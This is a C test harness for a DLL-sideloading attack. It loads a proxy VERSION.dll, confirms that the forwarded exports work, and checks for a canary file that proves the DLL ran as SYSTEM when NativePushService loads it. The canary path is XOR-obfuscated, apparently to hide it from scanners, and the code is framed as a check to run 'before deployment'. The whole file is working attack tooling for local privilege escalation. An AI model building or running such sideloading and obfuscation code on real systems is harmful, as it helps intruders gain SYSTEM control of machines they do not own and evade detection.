/*
 * test_proxy.c -- Verify VERSION.dll proxy works before deployment
 * Loads the proxy DLL and calls the 3 functions the service uses.
 * Canary will write to C:\Windows\Temp (will fail as standard user,
 * but we can verify the DLL loads and exports resolve).
 *
 * Compile:
 *   cl.exe test_proxy.c /Fe:test_proxy.exe /O1
 *
 * Run from the sideload/ directory (where version.dll was built):
 *   test_proxy.exe
 */

#include <windows.h>
#include <stdio.h>

int main(void)
{
    HMODULE hVer;
    FARPROC pInfo, pSize, pQuery;
    DWORD dummy;
    DWORD sz;
    void *block;
    BOOL ok;

    printf("[*] Loading VERSION.dll from current directory...\n");

    hVer = LoadLibraryA("VERSION.dll");
    if (!hVer) {
        printf("[!] LoadLibrary failed: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] VERSION.dll loaded at 0x%p\n", hVer);

    pInfo  = GetProcAddress(hVer, "GetFileVersionInfoW");
    pSize  = GetProcAddress(hVer, "GetFileVersionInfoSizeW");
    pQuery = GetProcAddress(hVer, "VerQueryValueW");

    printf("[*] Export resolution:\n");
    printf("    GetFileVersionInfoW:     0x%p %s\n", pInfo,  pInfo  ? "OK" : "FAIL");
    printf("    GetFileVersionInfoSizeW: 0x%p %s\n", pSize,  pSize  ? "OK" : "FAIL");
    printf("    VerQueryValueW:          0x%p %s\n", pQuery, pQuery ? "OK" : "FAIL");

    if (!pInfo || !pSize || !pQuery) {
        printf("[!] Missing exports -- proxy is broken\n");
        FreeLibrary(hVer);
        return 1;
    }

    printf("\n[*] Functional test: query version info of kernel32.dll...\n");

    typedef DWORD (WINAPI *fn_SizeW)(LPCWSTR, LPDWORD);
    typedef BOOL  (WINAPI *fn_InfoW)(LPCWSTR, DWORD, DWORD, LPVOID);
    typedef BOOL  (WINAPI *fn_QueryW)(LPCVOID, LPCWSTR, LPVOID*, PUINT);

    sz = ((fn_SizeW)pSize)(L"C:\\Windows\\System32\\kernel32.dll", &dummy);
    if (sz == 0) {
        printf("[!] GetFileVersionInfoSizeW returned 0: %lu\n", GetLastError());
    } else {
        printf("[+] GetFileVersionInfoSizeW: %lu bytes needed\n", sz);

        block = malloc(sz);
        if (block) {
            ok = ((fn_InfoW)pInfo)(L"C:\\Windows\\System32\\kernel32.dll", 0, sz, block);
            printf("[%c] GetFileVersionInfoW: %s\n", ok ? '+' : '!', ok ? "SUCCESS" : "FAILED");

            if (ok) {
                VS_FIXEDFILEINFO *ffi;
                UINT ffiLen;
                ok = ((fn_QueryW)pQuery)(block, L"\\", (LPVOID*)&ffi, &ffiLen);
                if (ok && ffiLen >= sizeof(VS_FIXEDFILEINFO)) {
                    printf("[+] VerQueryValueW: kernel32.dll version %d.%d.%d.%d\n",
                        HIWORD(ffi->dwFileVersionMS), LOWORD(ffi->dwFileVersionMS),
                        HIWORD(ffi->dwFileVersionLS), LOWORD(ffi->dwFileVersionLS));
                } else {
                    printf("[!] VerQueryValueW failed\n");
                }
            }
            free(block);
        }
    }

    printf("\n[*] Checking canary (will only exist with SYSTEM privs)...\n");
    {
        /* "C:\Windows\Temp\CHEYANNE_SYSTEM_CANARY.txt" XOR 0x41 */
        static const unsigned char xCanaryPath[] = {
            0x02, 0x7B, 0x1D, 0x16, 0x28, 0x2F, 0x25, 0x2E,
            0x36, 0x32, 0x1D, 0x15, 0x24, 0x2C, 0x31, 0x1D,
            0x17, 0x00, 0x05, 0x04, 0x13, 0x1E, 0x12, 0x18,
            0x12, 0x15, 0x04, 0x0C, 0x1E, 0x02, 0x00, 0x0F,
            0x00, 0x13, 0x18, 0x6F, 0x35, 0x39, 0x35
        };
        #define xCanaryPath_LEN 39
        unsigned char canaryBuf[64];
        int ci;
        for (ci = 0; ci < xCanaryPath_LEN; ci++)
            canaryBuf[ci] = xCanaryPath[ci] ^ 0x41;
        canaryBuf[xCanaryPath_LEN] = 0;
        if (GetFileAttributesA((const char *)canaryBuf) != INVALID_FILE_ATTRIBUTES) {
            printf("[+] CANARY EXISTS -- SYSTEM execution confirmed!\n");
        } else {
            printf("[-] No canary (expected as standard user -- DllMain write to %%windir%%\\Temp denied)\n");
            printf("    Canary will appear when loaded by NativePushService (LocalSystem)\n");
        }
        memset(canaryBuf, 0, sizeof(canaryBuf));
        #undef xCanaryPath_LEN
    }

    FreeLibrary(hVer);
    printf("\n[+] Proxy DLL test PASSED -- all exports functional\n");
    return 0;
}
